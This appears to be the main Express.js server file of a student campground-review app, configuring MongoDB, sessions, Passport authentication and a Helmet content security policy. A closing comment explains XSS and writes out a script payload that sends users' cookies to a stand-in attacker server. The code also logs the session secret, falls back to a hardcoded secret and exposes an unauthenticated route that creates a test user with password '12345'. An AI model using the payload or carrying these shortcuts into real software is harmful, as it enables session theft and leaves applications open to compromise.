if (process.env.NODE_ENV !== "production") {
  require("dotenv").config(); //the dotenv package will looking for .env file to get secret key
}

console.log(process.env.SECRET);
const express = require("express");
const app = express();
const path = require("path");
const mongoose = require("mongoose");
const session = require("express-session");
const passport = require("passport");
const LocalStrategy = require("passport-local");
const methodOverride = require("method-override");
const ExpressError = require("./utils/ExpressError");
const ejsMate = require("ejs-mate");
const flash = require("connect-flash");
const campgrounds = require("./routes/campgrounds");
const reviews = require("./routes/reviews");
const userRoute = require("./routes/users");
const User = require("./models/user");
const helmet = require("helmet");
const mongoSanitize = require("express-mongo-sanitize"); //use to prevent mongo injection,attacker may use query url to inject
const dbUrl = process.env.DB_URL || "mongodb://localhost:27017/campMap";
//"mongodb://localhost:27017/campMap"
const MongoStore = require("connect-mongo");
mongoose.connect(dbUrl, {
  useNewUrlParser: true,
  useCreateIndex: true,
  useUnifiedTopology: true,
  useFindAndModify: false,
});
const db = mongoose.connection;
db.on("error", console.error.bind(console.log("connection error")));
db.once("open", () => {
  console.log("database connected");
});
app.engine("ejs", ejsMate); //set view engine
app.use(methodOverride("_method"));
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const secret = process.env.SECRET || "thisshouldbebettersecret";
const store = MongoStore.create({
  mongoUrl: dbUrl,
  crypto: {
    secret,
  },
  touchAfter: 24 * 60 * 60,
});
store.on("error", function () {
  console.log("session store error");
});
const sessionConfig = {
  store,
  name: "session",
  secret,
  resave: false,
  saveUninitialized: true,
  cookie: {
    // secure: true,
    httpOnly: true, //connot use javascript to get this session cookie
    expires: Date.now() + 1000 * 60 * 60 * 24 * 7, //set expiration time
    maxAge: 1000 * 60 * 60 * 24 * 7,
  },
};
app.use(session(sessionConfig)); //set session config
app.use(flash()); //use flash to show immediate msg ex.login success ,not logged in update success/error
app.use(helmet());
const scriptSrcUrls = [
  "https://stackpath.bootstrapcdn.com/",
  "https://api.tiles.mapbox.com/",
  "https://api.mapbox.com/",
  "https://kit.fontawesome.com/",
  "https://cdnjs.cloudflare.com/",
  "https://cdn.jsdelivr.net",
];
const styleSrcUrls = [
  "https://kit-free.fontawesome.com/",
  "https://stackpath.bootstrapcdn.com/",
  "https://api.mapbox.com/",
  "https://api.tiles.mapbox.com/",
  "https://fonts.googleapis.com/",
  "https://use.fontawesome.com/",
];
const connectSrcUrls = [
  "https://api.mapbox.com/",
  "https://a.tiles.mapbox.com/",
  "https://b.tiles.mapbox.com/",
  "https://events.mapbox.com/",
];
const fontSrcUrls = [];
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: [],
      connectSrc: ["'self'", ...connectSrcUrls],
      scriptSrc: ["'unsafe-inline'", "'self'", ...scriptSrcUrls],
      styleSrc: ["'self'", "'unsafe-inline'", ...styleSrcUrls],
      workerSrc: ["'self'", "blob:"],
      objectSrc: [],
      imgSrc: [
        "'self'",
        "blob:",
        "data:",
        "https://res.cloudinary.com/dsz1v56zw/", //SHOULD MATCH YOUR CLOUDINARY ACCOUNT!
        "https://images.unsplash.com/",
      ],
      fontSrc: ["'self'", ...fontSrcUrls],
    },
  })
);
app.use(express.static(path.join(__dirname, "public")));
/*****use mongoSanitize to prevent mongo injection*****/
app.use(mongoSanitize());

/****use passport package to make autentication****/
app.use(passport.initialize()); //passport config
app.use(passport.session()); //set session
passport.use(new LocalStrategy(User.authenticate()));
passport.serializeUser(User.serializeUser());
passport.deserializeUser(User.deserializeUser());
/****use flash message as middleware*****/
app.use((req, res, next) => {
  //flash middleware
  console.log(req.query);
  res.locals.currentUser = req.user; //use middleware so that every page can recieve currentUser data
  res.locals.error = req.flash("error");
  res.locals.success = req.flash("success");
  next();
});
app.get("/fakeUser", async (req, res) => {
  const user = new User({ email: "test@gmail.com", username: "jeff" });
  const newUser = await User.register(user, "12345");
  res.send(newUser);
});
app.use("/", userRoute);
app.use("/campgrounds", campgrounds);
app.use("/campgrounds/:id/reviews", reviews);
app.get("/", (req, res) => {
  res.render("home");
}); //home page

app.all("*", (req, res, next) => {
  next(new ExpressError("Page Not Found", 404)); //next middleware will catch error
}); //add 404 error at the bottom of all route so when express cannot find matched route it will use this
app.use((err, req, res, next) => {
  const { statusCode = 500 } = err; //intialize error msg in case no error msg pass into it
  if (!err.message) err.message = "Oh No , Something Went Wrong";
  res.status(statusCode).render("error", { err });
}); //error handler
app.listen(3000, () => {
  console.log("Serving on port 3000");
});
/****************common security issue******************/
/*
  1. mongo injection
  2.xss attack:use search field to inject javascript or html tag,or steal cookie
    (2).attacker can inject script in url and send it to other people ,people who click once will be stole cookie 
    ex.www.website?<script>new Image().src="mybadserver/hacker?output="+document.cookie;</script>  the src attr will send a request and to get the user cookie and store in attaker server




*/
